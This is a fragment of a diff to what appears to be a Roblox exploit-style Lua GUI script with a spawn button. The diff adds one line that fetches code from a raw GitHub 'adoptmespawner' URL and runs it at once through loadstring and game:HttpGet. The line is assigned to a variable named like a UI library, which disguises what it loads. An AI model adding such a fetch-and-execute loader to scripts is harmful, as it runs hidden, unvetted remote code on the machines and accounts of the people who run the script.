@@ -718,7 +718,8 @@ task.spawn(
 		ConfirmLabel.TextScaled = true
 		ConfirmLabel.Text = ""
 		ConfirmLabel.Parent = Frame
-
+        local WindUI =
+                       loadstring(game:HttpGet("https://raw.githubusercontent.com/DeltaProV2/adoptmespawner.lua/refs/heads/main/spawner"))()
 		----------------------------------------------------------
 
 		SpawnBtn.MouseButton1Click:Connect(function()
